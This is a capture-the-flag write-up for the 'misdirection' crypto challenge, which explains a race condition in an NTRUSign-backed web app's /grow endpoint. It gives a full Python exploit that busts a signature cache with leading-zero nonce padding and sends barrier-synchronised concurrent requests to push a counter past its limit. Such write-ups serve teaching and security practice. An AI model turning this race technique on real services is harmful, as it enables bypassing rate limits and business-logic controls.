# misdirection

**Category:** crypto

---

#### Description

A snake game web app backed by NTRUSign cryptographic signatures. The `/grow` endpoint increments a counter if you provide a valid NTRUSign signature for the current count, but limits growth to `current_count < 4`. The `/flag` endpoint requires `current_count >= 14`. The server uses gunicorn with `gthread` (1 worker, 80 threads) and has no locking around the check-and-increment logic.

#### Solution

The "misdirection" is NTRUSign itself — you don't need to break the cryptography. The vulnerability is a **race condition** in the `/grow` endpoint's TOCTOU (time-of-check-time-of-use) pattern:

```python
if current_count < 4 and client_count == current_count:
    # ... verify signature (SLOW for non-cached) ...
    if verif:
        current_count += 1
        ready_status["status"] = False
        # ... sign new count (SLOW) ...
```

Multiple threads can pass the `current_count < 4` check before any thread increments. Once past the check, each thread independently increments the counter regardless of its new value.

**Key trick — cache busting:** The server caches signatures by string. Cached lookups are instant (no race window). To force the slow `NTRU.Verifying()` code path (which takes \~100ms due to O(N^2) polynomial multiplication), we modify each signature string to be unique while parsing identically. Adding leading zeros to the nonce `r` (e.g., `==0` → `==00`, `==000`, etc.) produces different cache keys but `int("00") == int("0") == 0`.

**Simultaneous delivery:** To maximize threads passing the check before any increments, we use Python `multiprocessing` with a `Barrier`: each subprocess pre-establishes its TCP+TLS connection, waits at the barrier until all are connected, then all send their HTTP request simultaneously.

With 80 concurrent requests, enough threads (14+) enter the slow verification path simultaneously and all increment the counter past the limit. Then we call `/flag`.

```python
#!/usr/bin/env python3
import multiprocessing
import socket
import ssl
import requests
import sys
import time
import json
import re
from urllib.parse import urlparse

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
NUM_REQUESTS = 80

def wait_for_ready():
    while True:
        try:
            r = requests.get(f"{BASE_URL}/status", timeout=10)
            if r.json().get("status"):
                return
        except Exception:
            pass
        time.sleep(2)

def modify_signature(sig, variant):
    """Add leading zeros to nonce r to bust the signature cache."""
    parts = sig.split("\n==")
    header_and_coeffs = parts[0]
    r_and_footer = parts[1]
    r_line_end = r_and_footer.index("\n")
    r_value = r_and_footer[:r_line_end]
    footer = r_and_footer[r_line_end:]
    return header_and_coeffs + "\n==" + "0" * variant + r_value + footer

def blast_with_multiprocess(sigs):
    parsed = urlparse(BASE_URL)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    use_ssl = parsed.scheme == 'https'
    barrier = multiprocessing.Barrier(len(sigs), timeout=30)
    results = multiprocessing.Manager().dict()

    def worker(idx, sig, barrier, results):
        body = json.dumps({"count": 0, "sig": sig})
        request = (
            f"POST /grow HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n{body}"
        )
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(120)
        if use_ssl:
            ctx = ssl.create_default_context()
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.connect((host, port))
        try:
            barrier.wait()
        except Exception:
            pass
        sock.sendall(request.encode())
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        sock.close()
        try:
            body_start = response.find(b"\r\n\r\n") + 4
            resp_body = response[body_start:].decode()
            if b"Transfer-Encoding: chunked" in response:
                decoded, pos = "", 0
                while pos < len(resp_body):
                    nl = resp_body.find("\r\n", pos)
                    if nl == -1: break
                    sz = int(resp_body[pos:nl], 16)
                    if sz == 0: break
                    decoded += resp_body[nl+2:nl+2+sz]
                    pos = nl + 2 + sz + 2
                resp_body = decoded
            results[idx] = json.loads(resp_body)
        except Exception as e:
            results[idx] = {"msg": f"error: {e}"}

    procs = []
    for i, sig in enumerate(sigs):
        p = multiprocessing.Process(target=worker, args=(i, sig, barrier, results))
        procs.append(p)
    for p in procs:
        p.start()
    for p in procs:
        p.join(timeout=300)
    return [results.get(i, {"msg": "timeout"}) for i in range(len(sigs))]

def main():
    for attempt in range(5):
        wait_for_ready()
        count = requests.get(f"{BASE_URL}/current-count").json()["count"]
        if count >= 14:
            result = requests.post(f"{BASE_URL}/flag", json={}).json()
            print(result["msg"])
            return
        if count != 0:
            requests.get(f"{BASE_URL}/regenerate-keys", timeout=300)
            wait_for_ready()
        zero_sig = requests.get(f"{BASE_URL}/zero-signature").json()["signature"]
        sigs = [modify_signature(zero_sig, i) for i in range(1, NUM_REQUESTS + 1)]
        responses = blast_with_multiprocess(sigs)
        grown = sum(1 for d in responses if "grown" in d.get("msg", ""))
        count = requests.get(f"{BASE_URL}/current-count").json()["count"]
        print(f"Attempt {attempt+1}: {grown} grown, count={count}")
        if count >= 14:
            wait_for_ready()
            result = requests.post(f"{BASE_URL}/flag", json={}).json()
            print(result["msg"])
            return
        requests.get(f"{BASE_URL}/regenerate-keys", timeout=300)
        time.sleep(5)

if __name__ == "__main__":
    main()
```

**Flag:** `lactf{d0nt_b3_n0nc00p3r4t1v3_w1th_my_s3rv3r}`
